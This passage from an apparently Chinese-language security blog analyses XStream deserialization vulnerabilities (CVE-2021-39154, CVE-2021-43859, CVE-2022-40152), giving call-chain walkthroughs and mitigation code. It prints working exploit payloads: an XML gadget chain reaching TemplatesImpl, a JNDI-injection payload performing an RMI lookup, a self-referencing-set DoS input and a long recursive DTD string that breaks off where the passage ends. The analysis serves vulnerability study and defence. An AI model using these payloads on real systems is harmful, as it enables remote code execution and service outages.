&lt;/bean&gt;</span><br><span class="line">            &lt;localCache&gt;</span><br><span class="line">              &lt;methods&gt;</span><br><span class="line">                &lt;entry&gt;</span><br><span class="line">                  &lt;string&gt;getOutputProperties&lt;/string&gt;</span><br><span class="line">                  &lt;list&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;getOutputProperties&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                  &lt;/list&gt;</span><br><span class="line">                &lt;/entry&gt;</span><br><span class="line">              &lt;/methods&gt;</span><br><span class="line">            &lt;/localCache&gt;</span><br><span class="line">          &lt;/attrIndexTable&gt;</span><br><span class="line">          &lt;shortCodeHeader__h__limit&gt;0&lt;/shortCodeHeader__h__limit&gt;</span><br><span class="line">        &lt;/outer-class&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string-array&gt;</span><br><span class="line">      &lt;string&gt;yxxx&lt;/string&gt;</span><br><span class="line">      &lt;string&gt;outputProperties&lt;/string&gt;</span><br><span class="line">    &lt;/string-array&gt;</span><br><span class="line">    &lt;string-array&gt;</span><br><span class="line">      &lt;string&gt;yxxx&lt;/string&gt;</span><br><span class="line">    &lt;/string-array&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这个依赖javafx，为了方便我直接导入了下面maven坐标：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;eu.mihosoft.vrl&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;vrl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.4.4.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>以PriorityQueue的readObject为入口点，触发comparator属性的compare方法，来到PackageWriter的compare方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141342705.png" alt="image-20230414134259599"></p>
<p>比较a0第一个元素和a1第一个元素是否相等，相等的话，从attrIndexTable属性中获取a0的第二个元素，这时候就来到了BeanAdapter的get方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141345322.png" alt="image-20230414134524221"></p>
<p>转正字符串，然后调用重载的get方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141346193.png" alt="image-20230414134612079"></p>
<p>在get方法中，先判断参数是否以Property结尾，不是的话调用getGetterMethod方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141347445.png" alt="image-20230414134730347"></p>
<p>在getGetterMethod方法先在字符串outputProperties前拼接个get字符串，然后从本地缓存中获取该字符串对应的方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141358408.png" alt="image-20230414135856334"></p>
<p>返回getOutputProperites方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141408456.png" alt="image-20230414140804372"></p>
<p>在get方法中直接执行了返回的getOutputProperites方法，将提前封装好的对象TemplatesImpl进行传入。后续就是经典TemplatesImpl利用链的部分了。</p>
<h2 id="CVE-2021-39154"><a href="#CVE-2021-39154" class="headerlink" title="CVE-2021-39154"></a>CVE-2021-39154</h2><h3 id="分析-31"><a href="#分析-31" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，而且跟<a href="#CVE-2021-39146">CVE-2021-39146</a>一模一样，实在搞不懂一份相同的POC搞两个CVE？而且将其放在官网。就因为不同的人发现的？那也应该把CVE给最先发现的那个人吧？</p>
<p>这是39154的致谢：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141426905.png" alt="image-20230414142612836"></p>
<p>这是39146的致谢：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141426757.png" alt="image-20230414142639688"></p>
<p>重点在于两个人怎么想到的？利用链、POC都一模一样，一个前一个后，这怕不是抄袭？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;string&gt;ggg&lt;/string&gt;</span><br><span class="line">                &lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;string&gt;rmi://localhost:1097/Object&lt;/string&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">          &lt;/tables&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<h2 id="分割线-3"><a href="#分割线-3" class="headerlink" title="分割线"></a>分割线</h2><p>终于肝完了1.4.17的14个漏洞。先看看1.4.18版本，将黑名单改成了白名单，白名单如下：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141621572.png" alt="image-20230414162135432"></p>
<p>以及如下类的子类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141624014.png" alt="image-20230414162419889"></p>
<h2 id="CVE-2021-43859"><a href="#CVE-2021-43859" class="headerlink" title="CVE-2021-43859"></a>CVE-2021-43859</h2><h3 id="分析-32"><a href="#分析-32" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成DOS，POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;set&gt;</span><br><span class="line">	&lt;set&gt;</span><br><span class="line">		&lt;string&gt;c&lt;/string&gt;</span><br><span class="line">		&lt;set reference=&#x27;../../../set/set&#x27;/&gt;</span><br><span class="line">	 &lt;/set&gt;</span><br><span class="line">&lt;/set&gt;</span><br></pre></td></tr></table></figure>

<p>由于set集合引用自身，所以当调用该set集合的hashCode方法时，会不断的去找引用，然后调用引用的hashCode，然后在引用的hashCode方法中，又找引用，再调用引用的hashCode，最终造成无线循环。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304142115307.png" alt="image-20230414211537174"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304142123768.png" alt="image-20230414212346659"></p>
<p>以下容易受到此攻击的类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.util.HashMap</span><br><span class="line">java.util.HashSet</span><br><span class="line">java.util.Hashtable</span><br><span class="line">java.util.LinkedHashMap</span><br><span class="line">java.util.LinkedHashSet</span><br><span class="line">java.util.Stack（仅限旧的 Java 修订版）</span><br><span class="line">java.util.Vector（仅限旧的 Java 修订版）</span><br><span class="line">其他使用其元素哈希码的第三方集合实现也可能受到影响</span><br></pre></td></tr></table></figure>

<h3 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h3><p>如果根本不使用引用，您可以简单地设置 NO_REFERENCE 模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XStream xstream = new XStream(); </span><br><span class="line">xstream.setMode(XStream.NO_REFERENCES);</span><br></pre></td></tr></table></figure>

<p>如果既不包含 Hashtable、HashMap 也不包含 HashSet（或它的子类之一），那么您可以使用安全框架来拒绝使用这些类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XStream xstream = new XStream(); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; </span><br><span class="line">	java.util.HashMap.class, java.util.HashSet.class, java.util.Hashtable.class, java.util.LinkedHashMap.class, java.util.LinkedHashSet.class </span><br><span class="line">&#125;) ;</span><br></pre></td></tr></table></figure>

<p>不幸的是，这些类型很常见。如果您只使用 HashMap 或 HashSet 并且您的 XML 仅将它们引用为默认map或collection，您可以在反序列化时另外更改 java.util.Map 和 java.util.Set 的默认实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.addDefaultImplementation（java.util.TreeMap.class，java.util.Map.class）；</span><br><span class="line">xstream.addDefaultImplementation（java.util.TreeSet.class，java.util.Set.class）；</span><br></pre></td></tr></table></figure>

<p>但是，这意味着您的应用程序不关心map的实现并且所有元素都是可比较的。</p>
<h2 id="分割线-4"><a href="#分割线-4" class="headerlink" title="分割线"></a>分割线</h2><p>以下是 1.4.19版本爆出的漏洞。</p>
<h2 id="CVE-2022-40152"><a href="#CVE-2022-40152" class="headerlink" title="CVE-2022-40152"></a>CVE-2022-40152</h2><h3 id="分析-33"><a href="#分析-33" class="headerlink" title="分析"></a>分析</h3><p>其实这算Woodstox的问题，不算XStream的问题，只是XStream会使用到Woodstox组件，在该组件的FullDTDReader.java类的readContentSpec方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141833004.png" alt="image-20230414183320838"></p>
<p>要是xml中有许多的<code>(</code>则会一直递归直到堆栈溢出，导致DOS。</p>
<p>poc如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE hT[</span><br><span class="line">&lt;!ELEMENT</span><br><span class="line"></span><br><span class="line">鲵u?</span><br><span class="line"></span><br><span class="line">(Andyo檇?,靗?,l?,l?,lL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,((l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,